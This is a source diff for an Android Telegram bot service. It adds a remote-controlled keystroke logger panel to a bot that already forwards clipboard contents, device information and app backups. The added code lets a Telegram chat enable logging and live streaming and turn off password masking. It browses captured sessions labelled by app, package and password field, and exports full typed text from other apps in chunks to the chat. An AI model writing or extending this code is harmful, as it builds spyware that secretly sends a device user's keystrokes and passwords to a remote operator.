@@ -70,6 +70,19 @@ public class TelegramBotService extends Service {
     // bkj           appbackup: send JSON
     // bkp           appbackup: send PDF
     // search        prompt search
+    // kl_m          keystroke logger main menu
+    // kl_on/kl_off  enable / disable logging
+    // kl_lv1/lv0    live mode on / off
+    // kl_mk1/mk0    mask-password on / off
+    // kl_bt1/bt0    batch-send on / off
+    // kl_ss         session list (page 1)
+    // kl_sp_N       session list page N
+    // kl_s_ID       session detail
+    // kl_x_ID       export session to chat
+    // kl_d_ID       delete session (confirm prompt)
+    // kl_dy_ID      delete confirmed
+    // kl_cl         clear all (confirm prompt)
+    // kl_cy         clear all confirmed
 
     // ─────────────────────────────────────────────────────────────────────────
     // Service lifecycle
@@ -239,6 +252,7 @@ public class TelegramBotService extends Service {
             case "/search":     if (arg.isEmpty()) promptSearch(chatId); else doSearch(chatId, arg); break;
             case "/stats":      cmdStats(chatId);                                               break;
             case "/lock":       cmdLock(chatId);                                                break;
+            case "/keylog":     cmdKeylog(chatId);                                              break;
             case "/cancel":     _pendingCmds.remove(chatId); send("❌ Cancelled.");             break;
             default:            send("❓ Unknown command. /start for help.");
         }
@@ -277,6 +291,7 @@ public class TelegramBotService extends Service {
         else if (data.startsWith("scf_"))    doSmartClipFull(chatId, parseInt(data.substring(4), 0));
         else if (data.equals("bk_sc"))       doPinnedSmartClips(chatId, msgId);
         else if (data.equals("search"))      promptSearch(chatId);
+        else if (data.startsWith("kl_"))     handleKlCallback(chatId, msgId, data);
     }
 
     // ─────────────────────────────────────────────────────────────────────────
@@ -355,6 +370,7 @@ public class TelegramBotService extends Service {
           + "⚙️ <b>System</b>\n"
           + "  /device — Device information\n"
           + "  /status — Bot &amp; app status\n"
+          + "  /keylog — Keystroke logger &amp; live capture\n"
           + "━━━━━━━━━━━━━━━━━━━━━━\n"
           + "<i>New clips are forwarded automatically.</i>";
         sendTo(chatId, msg);
@@ -925,6 +941,304 @@ public class TelegramBotService extends Service {
         }, "TG-search").start();
     }
 
+    // ─────────────────────────────────────────────────────────────────────────
+    // /keylog — Keystroke Logger
+    // ─────────────────────────────────────────────────────────────────────────
+
+    private void cmdKeylog(long chatId) {
+        KeystrokeLoggerService kl = KeystrokeLoggerService.getInstance(this);
+        boolean enabled = KeystrokeLoggerService.isEnabled(this);
+        boolean live    = KeystrokeLoggerService.isLive(this);
+        boolean maskPw  = KeystrokeLoggerService.isMaskPw(this);
+        boolean batch   = KeystrokeLoggerService.isBatch(this);
+        int sessions    = kl.getTotalSessions();
+        int totalKeys   = kl.getTotalKeys();
+        KeystrokeLoggerService.Session cur = kl.getCurrentSession();
+
+        String statusLine = enabled ? "✅ <b>ENABLED</b>" : "🔴 <b>DISABLED</b>";
+        String activeInfo = cur != null
+                ? "\n🟢 <b>Active:</b> <code>" + KeystrokeLoggerService.kh(cur.appName)
+                  + "</code> · " + cur.fieldType + " · " + cur.keyCount + " keys so far"
+                : "\n⚫ No active session";
+
+        String text = "⌨️ <b>Keystroke Logger</b>\n"
+                + "━━━━━━━━━━━━━━━━━━━━━━\n"
+                + "Status: " + statusLine + "\n"
+                + "📡 Live Stream: " + (live ? "✅ ON" : "❌ OFF") + "\n"
+                + "🔒 Mask Passwords: " + (maskPw ? "✅ ON" : "❌ OFF") + "\n"
+                + "📦 Batch Send: " + (batch ? "✅ ON" : "❌ OFF") + "\n"
+                + "━━━━━━━━━━━━━━━━━━━━━━\n"
+                + "📊 Sessions: <b>" + sessions + "</b>  ·  Total keys: <b>" + totalKeys + "</b>"
+                + activeInfo + "\n"
+                + "━━━━━━━━━━━━━━━━━━━━━━\n"
+                + "<i>Tap a button to configure or browse sessions.</i>";
+
+        String kb = "{\"inline_keyboard\":["
+                + "[{\"text\":\"" + (enabled ? "🔴 Disable Logging" : "✅ Enable Logging") + "\","
+                +   "\"callback_data\":\"" + (enabled ? "kl_off" : "kl_on") + "\"}],"
+                + "[{\"text\":\"📡 Live: " + (live ? "ON ✅" : "OFF ❌") + "\","
+                +   "\"callback_data\":\"" + (live ? "kl_lv0" : "kl_lv1") + "\"},"
+                +  "{\"text\":\"🔒 Mask PW: " + (maskPw ? "ON ✅" : "OFF ❌") + "\","
+                +   "\"callback_data\":\"" + (maskPw ? "kl_mk0" : "kl_mk1") + "\"}],"
+                + "[{\"text\":\"📦 Batch: " + (batch ? "ON ✅" : "OFF ❌") + "\","
+                +   "\"callback_data\":\"" + (batch ? "kl_bt0" : "kl_bt1") + "\"}],"
+                + "[{\"text\":\"📂 View Sessions\",\"callback_data\":\"kl_ss\"},"
+                +  "{\"text\":\"🗑 Clear All\",\"callback_data\":\"kl_cl\"}]]}";
+
+        sendWithMarkup(chatId, text, kb);
+    }
+
+    private void handleKlCallback(long chatId, int msgId, String data) {
+        if (data.equals("kl_m")) {
+            cmdKeylog(chatId);
+            return;
+        }
+        // Toggle settings
+        if (data.equals("kl_on"))  { KeystrokeLoggerService.prefs(this).edit().putBoolean(KeystrokeLoggerService.KEY_ENABLED, true).apply();  klRefreshMenu(chatId, msgId); return; }
+        if (data.equals("kl_off")) { KeystrokeLoggerService.prefs(this).edit().putBoolean(KeystrokeLoggerService.KEY_ENABLED, false).apply(); klRefreshMenu(chatId, msgId); return; }
+        if (data.equals("kl_lv1")) { KeystrokeLoggerService.prefs(this).edit().putBoolean(KeystrokeLoggerService.KEY_LIVE, true).apply();    klRefreshMenu(chatId, msgId); return; }
+        if (data.equals("kl_lv0")) { KeystrokeLoggerService.prefs(this).edit().putBoolean(KeystrokeLoggerService.KEY_LIVE, false).apply();   klRefreshMenu(chatId, msgId); return; }
+        if (data.equals("kl_mk1")) { KeystrokeLoggerService.prefs(this).edit().putBoolean(KeystrokeLoggerService.KEY_MASK_PW, true).apply(); klRefreshMenu(chatId, msgId); return; }
+        if (data.equals("kl_mk0")) { KeystrokeLoggerService.prefs(this).edit().putBoolean(KeystrokeLoggerService.KEY_MASK_PW, false).apply();klRefreshMenu(chatId, msgId); return; }
+        if (data.equals("kl_bt1")) { KeystrokeLoggerService.prefs(this).edit().putBoolean(KeystrokeLoggerService.KEY_BATCH, true).apply();   klRefreshMenu(chatId, msgId); return; }
+        if (data.equals("kl_bt0")) { KeystrokeLoggerService.prefs(this).edit().putBoolean(KeystrokeLoggerService.KEY_BATCH, false).apply();  klRefreshMenu(chatId, msgId); return; }
+        // Session list
+        if (data.equals("kl_ss"))           { doKlSessions(chatId, msgId, 1); return; }
+        if (data.startsWith("kl_sp_"))      { doKlSessions(chatId, msgId, parseInt(data.substring(6), 1)); return; }
+        // Session detail / export / delete
+        if (data.startsWith("kl_s_"))       { doKlSessionDetail(chatId, msgId, data.substring(5)); return; }
+        if (data.startsWith("kl_x_"))       { doKlExport(chatId, data.substring(5)); return; }
+        if (data.startsWith("kl_d_"))       { doKlDeleteConfirm(chatId, msgId, data.substring(5)); return; }
+        if (data.startsWith("kl_dy_"))      { doKlDeleteDo(chatId, msgId, data.substring(6)); return; }
+        // Clear all
+        if (data.equals("kl_cl"))           { doKlClearConfirm(chatId, msgId); return; }
+        if (data.equals("kl_cy"))           { doKlClearDo(chatId, msgId); return; }
+    }
+
+    private void klRefreshMenu(long chatId, int msgId) {
+        // Re-build and edit menu in place
+        new Thread(() -> cmdKeylogEdit(chatId, msgId), "KL-refresh").start();
+    }
+
+    private void cmdKeylogEdit(long chatId, int msgId) {
+        KeystrokeLoggerService kl = KeystrokeLoggerService.getInstance(this);
+        boolean enabled = KeystrokeLoggerService.isEnabled(this);
+        boolean live    = KeystrokeLoggerService.isLive(this);
+        boolean maskPw  = KeystrokeLoggerService.isMaskPw(this);
+        boolean batch   = KeystrokeLoggerService.isBatch(this);
+        int sessions = kl.getTotalSessions();
+        int totalKeys = kl.getTotalKeys();
+        KeystrokeLoggerService.Session cur = kl.getCurrentSession();
+
+        String activeInfo = cur != null
+                ? "\n🟢 <b>Active:</b> <code>" + KeystrokeLoggerService.kh(cur.appName) + "</code> · " + cur.keyCount + " keys"
+                : "\n⚫ No active session";
+
+        String text = "⌨️ <b>Keystroke Logger</b>\n"
+                + "━━━━━━━━━━━━━━━━━━━━━━\n"
+                + "Status: " + (enabled ? "✅ <b>ENABLED</b>" : "🔴 <b>DISABLED</b>") + "\n"
+                + "📡 Live Stream: " + (live ? "✅ ON" : "❌ OFF") + "\n"
+                + "🔒 Mask Passwords: " + (maskPw ? "✅ ON" : "❌ OFF") + "\n"
+                + "📦 Batch Send: " + (batch ? "✅ ON" : "❌ OFF") + "\n"
+                + "━━━━━━━━━━━━━━━━━━━━━━\n"
+                + "📊 Sessions: <b>" + sessions + "</b>  ·  Keys: <b>" + totalKeys + "</b>"
+                + activeInfo;
+
+        String kb = "{\"inline_keyboard\":["
+                + "[{\"text\":\"" + (enabled ? "🔴 Disable" : "✅ Enable") + "\","
+                +   "\"callback_data\":\"" + (enabled ? "kl_off" : "kl_on") + "\"}],"
+                + "[{\"text\":\"📡 Live: " + (live ? "ON ✅" : "OFF ❌") + "\","
+                +   "\"callback_data\":\"" + (live ? "kl_lv0" : "kl_lv1") + "\"},"
+                +  "{\"text\":\"🔒 Mask PW: " + (maskPw ? "ON ✅" : "OFF ❌") + "\","
+                +   "\"callback_data\":\"" + (maskPw ? "kl_mk0" : "kl_mk1") + "\"}],"
+                + "[{\"text\":\"📦 Batch: " + (batch ? "ON ✅" : "OFF ❌") + "\","
+                +   "\"callback_data\":\"" + (batch ? "kl_bt0" : "kl_bt1") + "\"}],"
+                + "[{\"text\":\"📂 Sessions\",\"callback_data\":\"kl_ss\"},"
+                +  "{\"text\":\"🗑 Clear All\",\"callback_data\":\"kl_cl\"}]]}";
+
+        editOrSend(chatId, msgId, text, kb);
+    }
+
+    private void doKlSessions(long chatId, int msgId, int page) {
+        new Thread(() -> {
+            try {
+                KeystrokeLoggerService kl = KeystrokeLoggerService.getInstance(this);
+                List<KeystrokeLoggerService.Session> all = kl.getSessions();
+                if (all.isEmpty()) {
+                    editOrSend(chatId, msgId, "⌨️ <b>Sessions</b>\n\n<i>No sessions recorded yet. Enable logging and start typing.</i>",
+                            backKb("kl_m", "◀ Back"));
+                    return;
+                }
+                int pageSize = 8, total = all.size();
+                int totalPages = Math.max(1, (total + pageSize - 1) / pageSize);
+                int pg = Math.max(1, Math.min(page, totalPages));
+                int from = (pg - 1) * pageSize, to = Math.min(from + pageSize, total);
+
+                String header = "📂 <b>Keystroke Sessions</b>  <i>Page " + pg + "/" + totalPages + "</i>\n"
+                        + "━━━━━━━━━━━━━━━━━━━━━━\n"
+                        + "<i>Tap a session to see full details.</i>";
+
+                StringBuilder kb = new StringBuilder("{\"inline_keyboard\":[");
+                for (int i = from; i < to; i++) {
+                    KeystrokeLoggerService.Session s = all.get(i);
+                    String label = (s.isPw ? "🔒 " : "📱 ") + truncate(s.appName, 16)
+                            + " · " + s.fieldType + " · " + s.keyCount + "k";
+                    kb.append("[{\"text\":").append(jstr(label))
+                      .append(",\"callback_data\":\"kl_s_").append(s.id).append("\"}],");
+                }
+                // Nav row
+                kb.append("[");
+                if (pg > 1) kb.append("{\"text\":\"◀ Prev\",\"callback_data\":\"kl_sp_").append(pg - 1).append("\"},");
+                kb.append("{\"text\":\"").append(pg).append("/").append(totalPages).append("\",\"callback_data\":\"kl_ss\"}");
+                if (pg < totalPages) kb.append(",{\"text\":\"Next ▶\",\"callback_data\":\"kl_sp_").append(pg + 1).append("\"}");
+                kb.append("],[{\"text\":\"◀ Back\",\"callback_data\":\"kl_m\"}]]}");
+
+                editOrSend(chatId, msgId, header, kb.toString());
+            } catch (Exception e) { editOrSend(chatId, msgId, "❌ Error: " + e.getMessage(), null); }
+        }, "KL-sess").start();
+    }
+
+    private void doKlSessionDetail(long chatId, int msgId, String sessionId) {
+        new Thread(() -> {
+            try {
+                KeystrokeLoggerService kl = KeystrokeLoggerService.getInstance(this);
+                List<KeystrokeLoggerService.Session> all = kl.getSessions();
+                KeystrokeLoggerService.Session s = null;
+                for (KeystrokeLoggerService.Session ss : all) if (ss.id.equals(sessionId)) { s = ss; break; }
+
+                if (s == null) { editOrSend(chatId, msgId, "❌ Session not found.", backKb("kl_ss", "◀ Back")); return; }
+
+                List<KeystrokeLoggerService.Entry> entries = kl.getEntries(sessionId);
+
+                StringBuilder keys = new StringBuilder();
+                for (KeystrokeLoggerService.Entry e : entries) {
+                    if (!e.modifiers.isEmpty()) keys.append("[").append(e.modifiers).append("+").append(e.keyText).append("]");
+                    else keys.append(e.keyText);
+                }
+                String keyStr = keys.toString();
+                boolean truncated = keyStr.length() > 600;
+                String preview = truncated ? keyStr.substring(0, 600) + "…" : keyStr;
+
+                String text = "⌨️ <b>Session Detail</b>\n"
+                        + "━━━━━━━━━━━━━━━━━━━━━━\n"
+                        + "📱 App: <code>" + KeystrokeLoggerService.kh(s.appName) + "</code>\n"
+                        + "📦 Pkg: <code>" + KeystrokeLoggerService.kh(s.appPkg) + "</code>\n"
+                        + "🔤 Field: " + KeystrokeLoggerService.kh(s.fieldType) + (s.isPw ? "  🔒 <i>Password</i>" : "") + "\n"
+                        + "🕐 Start: <i>" + KeystrokeLoggerService.fmtTime(s.startMs) + "</i>\n"
+                        + "⏱ Duration: <i>" + KeystrokeLoggerService.fmtDur(s.endMs - s.startMs) + "</i>\n"
+                        + "⌨️ Keys: <b>" + s.keyCount + "</b>\n"
+                        + "━━━━━━━━━━━━━━━━━━━━━━\n\n"
+                        + "<code>" + KeystrokeLoggerService.kh(preview) + "</code>"
+                        + (truncated ? "\n<i>(preview truncated — use Export for full)</i>" : "");
+
+                String kb = "{\"inline_keyboard\":["
+                        + "[{\"text\":\"📤 Export Full\",\"callback_data\":\"kl_x_" + s.id + "\"},"
+                        +  "{\"text\":\"🗑 Delete\",\"callback_data\":\"kl_d_" + s.id + "\"}],"
+                        + "[{\"text\":\"◀ Sessions\",\"callback_data\":\"kl_ss\"},"
+                        +  "{\"text\":\"⌨️ Menu\",\"callback_data\":\"kl_m\"}]]}";
+
+                editOrSend(chatId, msgId, text, kb);
+            } catch (Exception e) { editOrSend(chatId, msgId, "❌ Error: " + e.getMessage(), null); }
+        }, "KL-detail").start();
+    }
+
+    private void doKlExport(long chatId, String sessionId) {
+        new Thread(() -> {
+            try {
+                KeystrokeLoggerService kl = KeystrokeLoggerService.getInstance(this);
+                List<KeystrokeLoggerService.Session> all = kl.getSessions();
+                KeystrokeLoggerService.Session s = null;
+                for (KeystrokeLoggerService.Session ss : all) if (ss.id.equals(sessionId)) { s = ss; break; }
+                if (s == null) { sendTo(chatId, "❌ Session not found."); return; }
+
+                List<KeystrokeLoggerService.Entry> entries = kl.getEntries(sessionId);
+
+                StringBuilder sb = new StringBuilder();
+                sb.append("📤 <b>Full Export</b>\n")
+                  .append("━━━━━━━━━━━━━━━━━━━━━━\n")
+                  .append("📱 App: <code>").append(KeystrokeLoggerService.kh(s.appName)).append("</code>\n")
+                  .append("📦 Pkg: <code>").append(KeystrokeLoggerService.kh(s.appPkg)).append("</code>\n")
+                  .append("🔤 Field: ").append(KeystrokeLoggerService.kh(s.fieldType)).append(s.isPw ? " 🔒" : "").append("\n")
+                  .append("🕐 Start: ").append(KeystrokeLoggerService.fmtTime(s.startMs)).append("\n")
+                  .append("⏱ Duration: ").append(KeystrokeLoggerService.fmtDur(s.endMs - s.startMs)).append("\n")
+                  .append("⌨️ Keys: <b>").append(entries.size()).append("</b>\n")
+                  .append("━━━━━━━━━━━━━━━━━━━━━━\n\n");
+
+                StringBuilder keys = new StringBuilder();
+                for (KeystrokeLoggerService.Entry e : entries) {
+                    if (!e.modifiers.isEmpty()) keys.append("[").append(e.modifiers).append("+").append(e.keyText).append("]");
+                    else keys.append(e.keyText);
+                }
+                String ks = keys.toString();
+                // Send in chunks if too long
+                int chunkSize = 900;
+                if (ks.length() <= chunkSize) {
+                    sb.append("<code>").append(KeystrokeLoggerService.kh(ks)).append("</code>");
+                    sendTo(chatId, sb.toString());
+                } else {
+                    sendTo(chatId, sb.toString());
+                    for (int i = 0; i < ks.length(); i += chunkSize) {
+                        String chunk = ks.substring(i, Math.min(i + chunkSize, ks.length()));
+                        int part = (i / chunkSize) + 1;
+                        int total = (ks.length() + chunkSize - 1) / chunkSize;
+                        sendTo(chatId, "📄 <b>Part " + part + "/" + total + "</b>\n<code>"
+                                + KeystrokeLoggerService.kh(chunk) + "</code>");
+                    }
+                }
+            } catch (Exception e) { sendTo(chatId, "❌ Export error: " + e.getMessage()); }
+        }, "KL-export").start();
+    }
+
+    private void doKlDeleteConfirm(long chatId, int msgId, String sessionId) {
+        String text = "🗑 <b>Delete Session?</b>\n\n"
+                + "This will permanently delete session <code>" + sessionId + "</code>.\n"
+                + "This cannot be undone.";
+        String kb = "{\"inline_keyboard\":["
+                + "[{\"text\":\"✅ Yes, Delete\",\"callback_data\":\"kl_dy_" + sessionId + "\"},"
+                +  "{\"text\":\"❌ Cancel\",\"callback_data\":\"kl_s_" + sessionId + "\"}]]}";
+        editOrSend(chatId, msgId, text, kb);
+    }
+
+    private void doKlDeleteDo(long chatId, int msgId, String sessionId) {
+        new Thread(() -> {
+            KeystrokeLoggerService kl = KeystrokeLoggerService.getInstance(this);
+            boolean ok = kl.deleteSession(sessionId);
+            editOrSend(chatId, msgId,
+                    ok ? "✅ Session deleted." : "❌ Could not delete session.",
+                    backKb("kl_ss", "◀ Sessions"));
+        }, "KL-del").start();
+    }
+
+    private void doKlClearConfirm(long chatId, int msgId) {
+        KeystrokeLoggerService kl = KeystrokeLoggerService.getInstance(this);
+        int count = kl.getTotalSessions();
+        String text = "🗑 <b>Clear All Sessions?</b>\n\n"
+                + "This will permanently delete all <b>" + count + "</b> recorded sessions.\n"
+                + "This cannot be undone.";
+        String kb = "{\"inline_keyboard\":["
+                + "[{\"text\":\"✅ Yes, Clear All\",\"callback_data\":\"kl_cy\"},"
+                +  "{\"text\":\"❌ Cancel\",\"callback_data\":\"kl_m\"}]]}";
+        editOrSend(chatId, msgId, text, kb);
+    }
+
+    private void doKlClearDo(long chatId, int msgId) {
+        new Thread(() -> {
+            KeystrokeLoggerService kl = KeystrokeLoggerService.getInstance(this);
+            kl.clearAll();
+            editOrSend(chatId, msgId, "✅ All keystroke sessions cleared.",
+                    backKb("kl_m", "◀ Back to Menu"));
+        }, "KL-clear").start();
+    }
+
+    private static String truncate(String s, int max) {
+        if (s == null) return "";
+        return s.length() > max ? s.substring(0, max - 1) + "…" : s;
+    }
+
+    // ─────────────────────────────────────────────────────────────────────────
+    // /stats
+    // ─────────────────────────────────────────────────────────────────────────
+
     private void cmdStats(long chatId) {
         new Thread(() -> {
             try {
@@ -1416,6 +1730,11 @@ public class TelegramBotService extends Service {
     }
 
     private void send(String text) { sendTo(getChatId(this), text); }
+
+    public static void sendStatic(String text) {
+        TelegramBotService inst = _instance;
+        if (inst != null) inst.send(text);
+    }
 
     private void sendTo(long chatId, String text) {
         try {
